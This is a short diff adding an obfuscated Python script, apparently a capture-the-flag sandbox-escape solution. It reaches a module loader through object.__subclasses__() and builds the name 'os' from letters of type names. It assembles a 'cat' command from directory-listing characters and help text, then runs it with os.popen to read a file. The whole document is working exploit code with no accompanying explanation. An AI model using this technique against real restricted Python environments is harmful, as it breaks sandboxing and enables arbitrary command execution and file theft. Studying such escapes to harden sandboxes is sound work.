@@ -1,0 +1,9 @@
+s = []
+c = ().__class__.__mro__[1].__subclasses__()[120].load_module((1.2).__class__.__name__[2] + s.__class__.__name__[2]).listdir()[2][-1]
+a = ().__class__.__mro__[1].__subclasses__()[120].load_module((1.2).__class__.__name__[2] + s.__class__.__name__[2]).listdir()[2][2]
+t = ().__class__.__mro__[1].__subclasses__()[120].load_module((1.2).__class__.__name__[2] + s.__class__.__name__[2]).listdir()[0][-1]
+
+f = ().__class__.__mro__[1].__subclasses__()[120].load_module((1.2).__class__.__name__[2] + s.__class__.__name__[2]).listdir()[-2]
+completed = c+a+t+help.__doc__[6] +f
+
+().__class__.__mro__[1].__subclasses__()[120].load_module((1.2).__class__.__name__[2] + s.__class__.__name__[2]).popen(completed).read()
